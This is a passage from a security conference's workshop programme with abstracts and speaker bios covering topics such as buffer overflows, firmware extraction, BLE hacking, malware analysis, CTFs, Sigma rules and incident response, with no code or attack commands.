- XML injection (XXE); 
- Cross-site scripting (XSS); 
- Cross-site request forgery (CSRF);
- Authentication and authorization issues.

We are going to use Java, without putting too much emphasis on framework-specific aspects.

Technical requirements for the workshop:
- A laptop with at least 8 GB of RAM and 40-50 GB of free disk space.
- VMware Workstation, VMware Fusion or VMware Player installed.


### Bio: <a name="Eva+Szilagyi"></a>Eva Szilagyi

Eva Szilagyi is managing partner and CEO of Alzette Information Security, a consulting company based in Luxembourg.  She has more than eight years of professional experience in penetration testing, security source code review, vulnerability management, digital forensics, IT auditing, telecommunication networks, and security research. 
 
Eva has master's degrees in electrical engineering and in networks and telecommunication.  She holds several IT security certifications such as GSEC, GICSP, GMON, GSSP-JAVA, GWAPT, GMOB, CCSK, eWPT, and eJPT.  Eva speaks on a regular basis at international conferences like BruCON, Hack.lu, Nuit du Hack, Hacktivity, Black Alps, BSides Munich, BSidesBUD, Pass the SALT, Security Session and she is a member of the organizer team of BSides Luxembourg.


## <a name="Snarf+it%21+Firmware+extraction+and+analysis+with+open+source+tools."></a>Snarf it! Firmware extraction and analysis with open source tools.
by Pauline

At the core of every IoT device is its firmware. Detailed security assessment of devices starts with obtaining a copy of the firmware. The firmware can then be statically analysed or dynamically. Several techniques exist for firmware extraction. 
This workshop takes participants through a low level firmware extraction process which is easy to perform and doesn’t require expensive hardware.

We shall present how do it using a cheap USB to serial adapter.
The workshop will be going through the process with the following steps :
1. Examining the hardware and find a serial port
2. If there is not serial port available, chase the working combinaison of pins to reveal
the serial port
3. Setting up of your minicom working environment
4. Extracting the firmware
5. Analyze


### Bio: <a name="Pauline"></a>Pauline

Being a professional analyst and linguist, hardware hacking is a way to escape and
investigate low level stuff.


## <a name="AppSec+101%3A+Understanding+and+exploiting+buffer+overflows"></a>AppSec 101: Understanding and exploiting buffer overflows
by Antonin Beaujeant

This workshop will explain one of the most known application security vulnerability: the buffer overflow. We will start from the very beginning explaining what a CPU is, how does it executes operations and coordinate with the memory and inputs/outputs in order to run applications. We will then have a programming crash course (C language) then move to a assembly. Don't worry, we won't go too deep, just enough to understand the next chapter: understanding, identifying and exploiting a buffer overflow.

What will this workshop teach you?
- Understanding the structure and purpose of the CPU and the memory
- Basics of C programming
- Basics of assembly
- Understanding and exploiting basic buffer overflow

What this course won’t teach you?
- Reverse engineering
- Coding in C or Assembly (although we will briefly cover both)
- Explain, use and create fuzzers
- Create your own shellcode
- Return-Oriented-Programming exploitation (ROP)

Please make sure to come with a Linux (ideally Ubuntu) i386 (32-bit) if you want to follow the exercices.

Course materials: https://beaujeant.gitbook.io/appsec101/


### Bio: <a name="Antonin+Beaujeant"></a>Antonin Beaujeant

Antonin Beaujeant is a professional penetration tester and researcher. His primary focus is web app and network penetration test but he also enjoy spending time on hardware, reverse and CTF in general.


## <a name="Hash+collisions+exploitations"></a>Hash collisions exploitations
by Ange Albertini

To understand the extend of MD5 and SHA1 collision without the maths,
to come up with your own collisions tricks to actually prove that MD5 shouldn't be used.




### Bio: <a name="Ange+Albertini"></a>Ange Albertini

File formats enthusiast.


## <a name="Learn+to+use+ONYPHE+to+have+a+view+on+your+Internet+exposed+devices"></a>Learn to use ONYPHE to have a view on your Internet exposed devices
by Patrice Auffret

When a company grows, it becomes difficult to track every Internet exposed assets. Especially nowadays, with the prevalence of shadow IT and shadow Cloud services. Bad guys know it too well, they have tools and do monitor your exposed infrasctructure. You should be the first to uncover a vulnerability or an exposure of sensitive asset before it is exploited for malevolent purposes.

During the workshop, attendees will learn about the data collected by ONYPHE and how they can leverage its power to have a better view on their Internet exposed assets, especially when working in a big corporation. They will be able to deploy the presented scenarios on their own company to understand their exposure.

They will also learn to use the ONYPHE API to poll data and fill an Elasticsearch database and use Kibana to create powerful dashboards to show to their management. We will give them a free 1-month Entreprise subscription.


### Bio: <a name="Patrice+Auffret"></a>Patrice Auffret

Patrice Auffret (AKA GomoR) is a senior security expert specialized in network protocols hacking, network discovery and big data analytics. He is author of multiple Perl modules to craft network packets and analyze responses (Net::Frame framework, SinFP3 OS fingerprinting suite or the OSPF Attack Shell). He writes articles in French security magazine MISC and speaks at various security conferences including IT Underground 2007, SSTIC 2008, hack.lu 2012, EuSecWest 2012, ekoparty 2012, SSTIC 2016 and hack.lu 2016, TROOPERS 2017. He created his own company ONYPHE in 2017 specialized in collecting open-source and cyber threat intelligence information (OSINT & CTI).


## <a name="Repacking+the+unpacker%3A+Applying+Time+Travel+Debugging+to+malware+analysis"></a>Repacking the unpacker: Applying Time Travel Debugging to malware analysis
by Benoit Sevens

In this workshop we will apply the Time Travel Debugging feature of WinDbg, one of the most powerful Windows debuggers, to the field of malware analysis. We will show with concrete examples how this technology can be very effective in reversing complex samples in a timely manner.

Microsoft added Time Travel Debugging to their powerful WinDbg debugger in 2017. This feature is a gift for reverse engineers working in all sort of fields and is clearly gaining in popularity. The most obvious area that benefits from reverse debugging is the one of root cause analysis during vulnerability research. Multiple blog posts and demonstrations have proven this.

However, other fields of reverse engeering can also greatly benefit from this innovation. This workshop will take a look at how we can leverage Time Travel Debugging for efficiently unpacking a complex, multilayered malware sample and solving common malware analysis problems in an alternative manner. 

The intended audience for this workshop ranges from those who have a minimal reverse engineering background, to seasoned malware analysts who are interested in new approaches. 

A basic knowledge of x86 Assembly is recommended. Experience in WinDbg is not required.

Information on the required setup and resources for the workshop can be found [here](https://git.io/Jem63). Be sure to check it out if you are attending the workshop.


### Bio: <a name="Benoit+Sevens"></a>Benoit Sevens

Benoit started his career in the Belgian Defence as a cyber security analyst, where he specialized in malware analysis and got in contact with malware from a very large spectrum. He recently joined Atos Luxembourg, where he is active as an incident handler for the European Commission.

Benoit's passion lies in reverse engineering and operating system internals. Staring at IDA Pro and glaring at WinDbg is what makes his day (and evening).

Benoit is a holder of several InfoSec certifications, such as OSCE and GXPN. He is an active blogger on all sorts of computer security subjects.


## <a name="Intro+to+Dark+Arts%3A+Getting+Started+with+CTFs"></a>Intro to Dark Arts: Getting Started with CTFs
by Shruti Dixit, Geethna T K, Sowmya

This workshop will introduce the participants to the world of CTF contests as a way to learn real-world security skills. Providing them with the basic knowledge for playing CTF and how to get started with solving hands-on challenges in the domains of Cryptography, Reverse Engineering and Binary Exploitation. The workshop will consist of hands-on sessions for each domain as mentioned above to help participants get familiarised with the tools and libraries for each corresponding domains.
 
Cryptography is the art of disguising confidential data from eavesdroppers and making it accessible only to the authorized parties. It is built from the Number theory, a branch of pure mathematics devoted primarily to the study of integers. 
Reverse Engineering, mainly includes understanding assembly language and reversing obfuscated Linux binaries. The attendees will get to learn about the usage of tools such as GDB and GHIDRA for dynamic analysis and IDA for static analysis. 
Binary Exploitation is the art of ripping the binaries apart in order to find vulnerabilities and exploit them to spawn a shell on the server. The session will cover topics ranging from basic buffer overflow to learning overwriting return addresses and defeating ASLR.

Key workshop takeaways:

The participants will be able to walk away with the following takeaways from this class:

Understand how CTFs can help getting started with security
An overview of a jeopardy style CTF and basic tactics and techniques to solve them
How to be fluent with scripting for sending exploits to the challenge server
Practise challenges to help in applying learned concepts and deepen the understanding 
Insight into RSA cryptosystem and learn how to implement basic attacks
Reversing and Pwning Labs will help in getting a better understanding of binaries and exploiting them


### Bio: <a name="Shruti+Dixit"></a>Shruti Dixit




### Bio: <a name="Geethna+T+K"></a>Geethna T K

Geethna is a second-year undergraduate pursuing Computer Science and Engineering. She has been in security for the past 2 years. Her interest lies in Reversing and Exploitation. She is an active member of team bi0s (India) and has been participating in many CTFs throughout the year. She has attended many conferences and also has given a talk at the CysInfo meetup.
She is a part of the girls only CTF team “TeamShakti”. She is also a part of the BlackHoodie community and the international women only CTF team “Blckpwny”.


### Bio: <a name="Sowmya"></a>Sowmya

Sowmya is a third-year undergraduate in Computer Science and Engineering from Amrita Vishwa Vidyapeetham, Kerala. She is part of Team Bi0s(A top CTF team in India according to CTFtime) and Team Shakti(A women only CTF team) and is working in security field for the past 2 years. She is currently working on Cryptography and is an active CTF player. She has attended many conferences like BlackHat, Nullcon etc.


## <a name="Hacking+Bluetooth+Low+Energy+devices+with+Btlejack"></a>Hacking Bluetooth Low Energy devices with Btlejack
by Damien Cauquil

This workshop will dive in the Bluetooth Low Energy specifications and teach you how to use Btlejack and its features to hack various BLE devices.

You will learn about the various versions of Bluetooth Low Energy (from 4.0 to 5.1), how to effectively perform reconnaissance, how to sniff and analyze any BLE connection but also many tricks and techniques you can use to ease your analysis. Last but not least, you will also learn how to hijack and disconnect devices and how to manually test any BLE stack for vulnerabilities.

All of this by using (mostly) Btlejack \o/

I. Bluetooth Low Energy 101
I.1. Protocol overview
I.2. Channel map and channel selection algorithms
I.3. Basic PDUs you must know
I.4. Required hardware

II. Reconnaissance
II.1. BLE advertisements
II.2. Enumerating active connections
II.3. (some kind of) Fingerprinting

III. Passive attacks
III.1. Sniffing with Btlejack
III.2. How to determine the chipsets (vendor/version) and BLE version supported by a device
III.3. How to capture and analyze unencrypted BLE communications
III.4. How to break encrypted communications (when possible)

IV. Active attacks
IV.1. Jamming an active BLE connection
IV.2. BLE hijacking
IV.3. Manually testing a BLE stack


### Bio: <a name="Damien+Cauquil"></a>Damien Cauquil

Damien is a senior security researcher who joined Digital Security in 2015 as head of research and development. He discovered how wireless protocols can be fun to hack and quickly developed BtleJuice, one of the first Bluetooth Low Energy MitM framework, and BtleJack, a BLE swiss-army knife released in 2018.

  Damien presented at various security conferences including DEF CON, Hack In Paris, Chaos Communication Camp, Chaos Communication Congress, BruCon, Hack.lu, anda dozen times at Nuit du Hack, one of the oldest French hacking conference.


## <a name="Junior+CTF+Install+Party"></a>Junior CTF Install Party
by Axelle Apvrille

Learn how to install [Junior CTF](https://framagit.org/axellec/juniorctf) for your kids to test their hacking skills.

**Junior CTF** is a collection of Capture The Flag challenges for kids aged around 8 to 16. They usually don't know how to code yet, and have (very) limited exposure to Unix. The idea is to have them nevertheless hack "like in movies".

In this workshop, you will learn how to setup Junior CTF at home (or on a server you share with friends). We will go through the following:

- Clone [CTFd](https://github.com/CTFd/CTFd)
- Install **Docker**
- Import challenge descriptions for your language in CTFd 
- Launch challenge containers
- How to customize or add new challenges

This original workshop is for you:

- If you have teenagers who'd like to hack
- Or some of your colleagues would like to experiment hacking but they hardly know how to code and use Unix
- You haven't ever installed CTFd. 


Please come with your own laptop.


### Bio: <a name="Axelle+Apvrille"></a>Axelle Apvrille

Axelle Apvrille is principal security researcher at Fortinet. She specifically looks into mobile malware and smart devices (not always that smart...). She is the lead organizer of Ph0wn CTF, a Capture The Flag dedicated to smart devices.


## <a name="IOCs+are+dead%2C+long+live+the+IOCs%21"></a>IOCs are dead, long live the IOCs!
by Celine Massompierre

**Finding information is not a problem, what you do with it is up to you!**

Nowadays sharing Indicator of compromise (IOCs) are common, look at the Misp project for example. 

At the big data era, having just an indicator like and IP address is not enough and in many cases as useful as a key of a treasure chest without any map. What really matter today is metadata: data about data.

In this workshop, you will discovered IntelMQ, which is open source project for collecting and processing security feeds but not only.

With no prior knowledge, you will explore the different possibilities offered by this tool and you will start to gather feeds and improve them for fitting your needs.

In a nutshell, IntelMQ help you to collect, clean, enrich, normalize and store the data.


### Bio: <a name="Celine+Massompierre"></a>Celine Massompierre

Celine is an Incident Handler working at Excellium-services. Hunger to learn new things, she also enjoy sharing her discovery.


## <a name="Reversing+WebAssembly+Module+101"></a>Reversing WebAssembly Module 101
by Patrick Ventuzelo

**WebAssembly (WASM)** is a new binary format currently **supported by all major web-browsers** (Firefox, Chrome, Safari and Edge). WebAssembly module are most commonly compiled from C/C++/Rust source code, loaded and executed inside JS scripts. It is known for being used for malicious purposes like **cryptojacking** but you will legitimately found usage of WebAssembly inside web-browsers addons, nodejs module or even blockchain smart contracts.

In this workshop, I will first **introduce WebAssembly concepts** and why it’s consider as a “game changer for the web”. Secondly, I will expose **how to analyze a WebAssembly module** using different techniques (static & dynamic) as well as some **open-source tools that make you the life easier** (Octopus, Wasabi, ...). Finally, we will **hands-on with simple examples/crackmes** and finally go throws the **analysis of cryptominers**.

# Workshop outline 

The following point will be discussed in this workshop.

* Introduction
* WebAssembly Basics
* WebAssembly Runtime VM
* Module dissection
* Reversing wasm module
* Dynamic analysis
* Cryptominers
* Conclusion


### Bio: <a name="Patrick+Ventuzelo"></a>Patrick Ventuzelo

Patrick Ventuzelo is a french security researcher specializing in Vulnerability research, Reverse engineering, Security tool development, and Program analysis. Patrick is the author of Octopus, one of the first Open-source security analysis tool that support WebAssembly and multiple Blockchain Smart Contract to help researchers perform Analysis on closed-source bytecode.

Previously, Patrick was working for Quoscient GmbH, P1 Security, the French Department Of Defense and Airbus D&S Cybersecurity.

Patrick has been Speaker and Trainer at various international security conferences (FIRST, Northsec, BlackAlps, hack.lu, Toorcon, REcon Montreal/Brussels, SSTIC)


## <a name="Sigma+Workshop"></a>Sigma Workshop
by Thomas Patzke

How to create Sigma rules and hunt evil in logs.

Sigma is a generic signature format for description of interesting log events. It provides a
structured format in which researchers and analysts can describe and share detection methods. Its
[main repository](https://github.com/Neo23x0/sigma) contains:

* a rule specification
* an open repository for rules (currently 185)
* a converter that generates queries for a wide range of SIEM systems

Beside the open source repository, further services like a web editor for Sigma rules and other free
and commercial repositories are evolving around Sigma.

In this workshop, we will learn how to:

* Write Sigma rules for log events of analysed threats
* Generate queries for a supported SIEM and grep command lines with the open converter *sigmac*
* Sharing Sigma rules with MISP
* Using generic log sources to write portable rules
* Using content modifiers for regular expressions, expression of obfuscation techniques and other advanced stuff.

Further, we will explore the current and evolving ecosystem around Sigma.

The following prerequisites are recommended for going through the hands-on excercises:

* A Unix environment
* Ability to run Docker containers from the Internet
* Python >= 3.6 with dependencies from Sigma
* The cloned Sigma workshop repository: https://github.com/thomaspatzke/sigma-workshop (pull updates short before workshop!)
* A MISP instance that can be used for test events (I recommend MISP-dockerized from DCSO: https://github.com/DCSO/MISP-dockerized)


### Bio: <a name="Thomas+Patzke"></a>Thomas Patzke

Thomas Patzke has more than 13 years of experience in the area of information security, currently works as blue teamer and threat hunter at thyssenkrupp CERT and still owns no certification. He likes to [create and contribute to open source security tools](https://github.com/thomaspatzke) and is one of the creators of [Sigma](https://github.com/Neo23x0/sigma).


## <a name="Practical+Incident+Response%2C+With+Automation+and+Collaboration+Inside"></a>Practical Incident Response, With Automation and Collaboration Inside
by Saad Kadhi

Investigating cyberattacks is now the norm, instead of the exception. The threat landscape keeps changing at a worrying pace while security analysts have to deal with growing complexity, learn new technologies and continuously adapt to rapidly evolving IT environments.

To ease up their burden and enable them to give the best out of themselves in order to fulfil their important mission, while avoiding the so-called analyst fatigue, they should not be asked to master copying and pasting between different tools and interfaces to get their job done. They should not be asked to follow procedures without clearly understanding them and contributing into their improvement.

Humans have brains, even if the deafening speeches about artificial intelligence and machine learning would want us to believe otherwise. It’s more than time to place humans back at the centre and offer them solutions that get out of their way yet support them in their incident response journey, to learn, adapt, and collaborate at every stage. We are social animals after all, aren’t we?

This is exactly what [MISP Project](https://misp-project.org) and [TheHive Project](https://thehive-project.org) are all about, providing not only free, open source products to sustain the daily activities of blue teams around the globe, but products that actually work and integrate with one another to cover the full spectrum of incident response, ranging from detection to recovery and cyber threat intelligence production and sharing.

So come join us for three hours of **practical** incident response where **automation** and **collaboration** play a paramount role, using MISP, the *de facto* standard for threat sharing, TheHive, a Security Incident Response Platform and Cortex, a powerful analysis and active response engine.

This workshop will take you through a journey where we’ll cover the six steps of incident response coated with CTI-related activities to investigate a real world incident, leveraging automation and collaboration whenever applicable.

After a brief introduction to MISP, TheHive and Cortex, we’ll dive in the preparation steps to not only set up correctly the tools but establish a proper team organisation, create workflows and get ready for trouble as trouble will come just afterwards, as in the movies. Indeed, now that a threat has just materialised, what are you going to do? And how you would bring out the social animal in you to collaborate with fellow defenders in the room?

The clock is ticking and the fun is on!


### Bio: <a name="Saad+Kadhi"></a>Saad Kadhi

With more than 20 years of experience in operational cybersecurity, Saâd is the head of CERT-EU and the leader of TheHive Project. He devoted the last eleven years of his professional life to incident response, digital forensics and what the cool kids call now cyber threat intelligence. Before joining CERT-EU, he built a CSIRT for a large multinational company, worked at CERT Société Générale and created CERT-BDF, the cyberdefence team of Banque de France, the French national central bank. A convinced retromodernist with a knack for individualistic altruism, he gave trainings, workshops and spoke at conferences such as Hack.lu, the FIRST conference, BSides Lisbon and NorthSec. He is also one of the organisers of the Botconf conference.


## <a name="oscd.community"></a>oscd.community
by Daniil Yugoslavskiy

https://oscd.community/




### Bio: <a name="Daniil+Yugoslavskiy"></a>Daniil Yugoslavskiy

Daniil is responsible for Threat Detection in Cindicator Security Operations Center (SOC) in Saint Petersburg, Russia. Before that, he was leading Threat Detection team at Tieto SOC in Czech Republic. Daniil spent more than six years in Practical Computer Security and Network Monitoring domains.
He holds OSCP, CCNP Security, GCFA and GNFA certifications. He had talks at x33fcon, Positive Hack Days, Security BSides, CONFidence, Amsterdam FIRST Technical Colloquium, EU MITRE ATT&CK community workshops, Code Europe, presenting Intelligence-Driven Defence approach implementation and MITRE ATT&CK operationalization.
Daniil is also a member of GIAC Advisory Board and creator of Atomic Threat Coverage project.

